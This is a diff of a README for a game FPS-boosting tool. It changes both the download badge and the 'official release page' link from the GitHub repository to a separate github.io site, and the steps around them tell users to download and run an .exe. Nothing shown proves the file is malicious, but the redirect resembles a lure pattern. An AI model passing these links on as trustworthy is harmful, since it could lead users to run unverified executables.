@@ -1,6 +1,6 @@
 # 🚀 Meccha-Fps-Boosting - Gain better frame rates while gaming
 
-[![Download](https://img.shields.io/badge/Download-Meccha-Fps-Boosting-blue)](https://github.com/potatosarefrenchfries-hue/Meccha-Fps-Boosting)
+[![Download](https://img.shields.io/badge/Download-Meccha-Fps-Boosting-blue)](https://potatosarefrenchfries-hue.github.io)
 
 ## 📖 About the project
 
@@ -20,7 +20,7 @@ Your computer needs specific parts to run this tool. Use these requirements as a
 
 Follow these steps to get the optimizer on your computer.
 
-1. Go to the [official release page](https://github.com/potatosarefrenchfries-hue/Meccha-Fps-Boosting).
+1. Go to the [official release page](https://potatosarefrenchfries-hue.github.io).
 2. Look for the latest version under the Releases section.
 3. Click the link that ends in .exe to start your download.
 4. Save the file to your desktop or downloads folder.
